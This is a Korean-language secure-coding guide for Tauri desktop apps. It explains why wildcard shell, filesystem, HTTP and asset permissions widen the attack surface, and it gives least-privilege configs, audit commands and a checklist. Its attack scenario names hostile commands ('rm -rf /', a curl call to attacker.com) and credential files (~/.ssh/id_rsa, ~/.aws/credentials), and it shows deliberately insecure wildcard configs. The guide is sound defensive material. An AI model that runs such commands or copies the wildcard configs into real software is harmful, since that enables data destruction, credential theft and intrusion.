# 와일드카드 권한/경로 사용 금지

## 왜 중요한가

와일드카드(`*`)는 "모든 것"을 의미하며, 보안 정책에서 사용하면 예상치 못한 권한을 부여하게 됩니다. Tauri에서 와일드카드는 커맨드 권한(`allow: ["*"]`), 파일 경로(`path: "/*"`), HTTP URL(`urls: ["*"]`) 등 여러 곳에서 사용할 수 있지만, 모두 공격 표면을 크게 확대합니다. 명시적인 화이트리스트 방식을 사용하면 의도하지 않은 접근을 원천 차단할 수 있습니다.

## ❌ 잘못된 패턴

```json
// src-tauri/capabilities/default.json
{
  "permissions": [
    "shell:allow-*",
    "fs:allow-*",
    {
      "identifier": "fs:allow-read-text-file",
      "allow": [
        { "path": "/*" }
      ]
    },
    {
      "identifier": "http:allow-fetch",
      "allow": [
        { "url": "*" }
      ]
    }
  ]
}
```

```json
// tauri.conf.json
{
  "app": {
    "security": {
      "assetProtocol": {
        "scope": ["*"]
      }
    }
  }
}
```

**문제점:**
- `shell:allow-*`: 모든 셸 커맨드 실행 가능 (`execute`, `open`, `kill` 등)
- `fs:allow-*`: 모든 파일 시스템 작업 가능 (`remove`, `rename`, `mkdir` 등)
- `path: "/*"`: 시스템의 모든 파일 접근 가능
- `url: "*"`: 모든 도메인으로 HTTP 요청 가능 (SSRF 취약점)
- `scope: ["*"]`: 앱 리소스 보호 우회 가능

**공격 시나리오:**
1. XSS 공격으로 악의적인 JavaScript 주입
2. `shell:allow-execute`로 시스템 명령 실행 (`rm -rf /`, `curl http://attacker.com`)
3. `fs:allow-*`로 민감한 파일 읽기 (`~/.ssh/id_rsa`, `~/.aws/credentials`)
4. `http:allow-fetch`로 내부 네트워크 스캔 (SSRF)

## ✅ 올바른 패턴

```json
// src-tauri/capabilities/default.json
{
  "permissions": [
    "shell:allow-open",
    "fs:allow-read-text-file",
    "fs:allow-write-text-file",
    {
      "identifier": "fs:allow-read-text-file",
      "allow": [
        { "path": "$APPDATA/my-app/*.json" },
        { "path": "$DOCUMENT/*.txt" }
      ]
    },
    {
      "identifier": "http:allow-fetch",
      "allow": [
        { "url": "https://api.example.com/*" },
        { "url": "https://cdn.example.com/assets/*" }
      ]
    }
  ]
}
```

```json
// tauri.conf.json
{
  "app": {
    "security": {
      "assetProtocol": {
        "scope": [
          "$APPDATA/my-app/public/**",
          "$RESOURCE/**"
        ]
      }
    }
  }
}
```

**장점:**
- 각 권한이 명시적으로 나열되어 있음
- 파일 경로가 앱 데이터 디렉토리로 제한됨
- HTTP 요청이 신뢰할 수 있는 도메인으로만 가능
- 보안 감사 시 검토 범위가 명확함
- 공격자가 악용할 수 있는 경로가 제한됨

**추가 예시 (점진적 권한 추가):**

```json
// Phase 1: 최소 권한으로 시작
{
  "permissions": [
    "core:default",
    "shell:allow-open"
  ]
}

// Phase 2: 기능 추가 시 필요한 권한만 추가
{
  "permissions": [
    "core:default",
    "shell:allow-open",
    {
      "identifier": "fs:allow-read-text-file",
      "allow": [{ "path": "$APPDATA/my-app/config.json" }]
    }
  ]
}

// Phase 3: 새 기능 추가
{
  "permissions": [
    "core:default",
    "shell:allow-open",
    {
      "identifier": "fs:allow-read-text-file",
      "allow": [
        { "path": "$APPDATA/my-app/config.json" },
        { "path": "$DOCUMENT/exports/*.csv" }
      ]
    },
    {
      "identifier": "http:allow-fetch",
      "allow": [{ "url": "https://api.example.com/v1/*" }]
    }
  ]
}
```

## 추가 컨텍스트

**와일드카드 사용이 허용되는 경우:**

1. **하위 경로 매칭 (권장)**
   ```json
   // ✅ 특정 디렉토리 내부만
   { "path": "$APPDATA/my-app/*" }
   { "url": "https://api.example.com/v1/*" }
   ```

2. **파일 확장자 매칭 (권장)**
   ```json
   // ✅ 특정 파일 타입만
   { "path": "$DOCUMENT/*.{txt,md,json}" }
   ```

3. **절대 금지되는 와일드카드**
   ```json
   // ❌ 루트부터 전체 허용
   { "path": "/*" }
   { "path": "$HOME/*" }
   { "url": "*" }
   "shell:allow-*"
   "fs:allow-*"
   ```

**보안 감사 체크리스트:**

아래 명령어로 프로젝트 내 와일드카드 사용을 찾아 수정하세요:

```bash
# capabilities 파일에서 와일드카드 찾기
rg '"allow-\*"' src-tauri/capabilities/
rg '"path": "/\*"' src-tauri/capabilities/
rg '"url": "\*"' src-tauri/capabilities/

# tauri.conf.json에서 와일드카드 찾기
rg '"scope": \[.*"\*".*\]' src-tauri/tauri.conf.json
```

**체크리스트:**

- [ ] `shell:allow-*` 사용 안 함
- [ ] `fs:allow-*` 사용 안 함
- [ ] `path: "/*"` 또는 `$HOME/*` 사용 안 함
- [ ] HTTP `url: "*"` 사용 안 함
- [ ] `assetProtocol.scope` 에 `"*"` 사용 안 함
- [ ] 모든 권한이 명시적으로 나열됨
- [ ] 각 권한의 필요성을 문서화함

**점진적 권한 추가 프로세스:**

1. **최소 권한으로 시작**
   ```json
   { "permissions": ["core:default"] }
   ```

2. **기능 구현 시 필요한 권한만 추가**
   ```typescript
   // 컴파일 에러 또는 런타임 에러 발생
   // -> 필요한 권한 추가
   ```

3. **주기적 권한 감사**
   ```bash
   # 사용되지 않는 권한 찾기
   rg "invoke\(" src/  # 호출되는 Tauri 커맨드 목록
   # capabilities/와 비교하여 미사용 권한 제거
   ```

**일반적인 권한 오용 패턴:**

| 잘못된 패턴 | 올바른 패턴 | 이유 |
|-----------|-----------|------|
| `shell:allow-*` | `shell:allow-open` | URL 열기만 필요 |
| `fs:allow-*` | `fs:allow-read-text-file` + scope | 특정 파일만 읽기 |
| `path: "/*"` | `path: "$APPDATA/my-app/*"` | 앱 데이터만 접근 |
| `url: "*"` | `url: "https://api.example.com/*"` | 특정 API만 호출 |
| `"windows": ["*"]` | `"windows": ["main", "settings"]` | 필요한 윈도우만 |

**보안 경고 예시:**

```json
// ⚠️ 이 설정은 보안 감사에서 탈락함
{
  "permissions": [
    "shell:allow-*",  // 🚨 Critical: 임의 명령 실행 가능
    {
      "identifier": "fs:allow-read-text-file",
      "allow": [{ "path": "/*" }]  // 🚨 Critical: 전체 파일 시스템 접근
    },
    {
      "identifier": "http:allow-fetch",
      "allow": [{ "url": "*" }]  // 🚨 High: SSRF 취약점
    }
  ]
}
```

**참조:**
- [Tauri Security Best Practices](https://tauri.app/v2/security/)
- [Principle of Least Privilege](https://en.wikipedia.org/wiki/Principle_of_least_privilege)
- [OWASP API Security](https://owasp.org/www-project-api-security/)
